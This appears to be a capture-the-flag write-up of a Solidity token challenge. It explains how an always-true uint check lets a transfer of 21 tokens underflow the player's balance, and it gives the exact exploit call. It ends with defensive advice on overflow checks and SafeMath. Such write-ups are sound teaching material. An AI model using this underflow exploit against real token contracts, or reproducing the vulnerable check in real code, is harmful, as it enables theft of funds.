# Token

## Key

1. Conditional always true

```js
mapping(address => uint) balances;
 ...
require(balances[msg.sender] - _value >= 0);
```

As `balances` has `uint` no matter how many token we substract, we **always** going to get a result >=0. A `uint256` can't store a negative number, only a number from 0 to 2^256-1. 2. Underflow unsigned integer

```js
mapping(address => uint) balances;
 ...
require(balances[msg.sender] - _value >= 0);
balances[msg.sender] -= _value;
```

```
0      -> 1157920892... (~2^256-1)
UNDERFLOW
000000 -> 0000000000
                  -1
          ----------
          1111111111   (big number)
OVERFLOW
000000 -> 1111111111
                  +1
          ----------
       (1)0000000000    (small number)
```

As we have 20 token, we are looking to get `-1` es total, therefore we transfer 21 tokens so our account ends up having a huge number after substraction.

## Solution

1. Find any other existing account
2. Transfer to get in our player account this substraction and underflow

```js
await contract.transfer('0x9727231224f0D56A7dd7fdbce927D00d4912e759', 21);
```

## Post solution info

Overflows are very common in solidity and must be checked for with control statements such as:

```js
if (a + c > a) {
  a = a + c;
}
```

An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

```js
a = a.add(c);
```

If there is an overflow, the code will revert.
